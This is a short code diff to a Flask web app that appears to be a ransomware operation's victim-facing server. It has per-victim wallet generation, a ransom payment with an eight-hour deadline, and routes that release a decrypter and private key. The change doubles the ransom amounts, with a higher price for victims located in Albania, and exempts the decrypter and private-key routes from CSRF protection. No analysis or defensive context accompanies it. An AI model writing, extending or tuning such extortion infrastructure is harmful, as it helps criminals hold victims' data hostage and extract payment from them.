@@ -42,9 +42,9 @@ def new_user():
         tz = datetime.now().astimezone().tzinfo
         expiration_date = datetime.now(tz=tz) + timedelta(hours=8)
 
-        payment = 25
+        payment = 50
         if geolocation.get("country") == "Albania":
-            payment = 50
+            payment = 100
 
         wallet = gen_wallet(sanitized_data.get("uid"))
 
@@ -118,6 +118,7 @@ def status(uid):
 
 
 @app.route('/decrypter/<uid>', methods=['GET'])
+@csrf.exempt
 def download_decrypter(uid):
     try:
         uid = clean(uid)
@@ -142,6 +143,7 @@ def download_decrypter(uid):
 
 
 @app.route('/private-key/<uid>', methods=['GET'])
+@csrf.exempt
 def download_private_key(uid):
     try:
         uid = clean(uid)
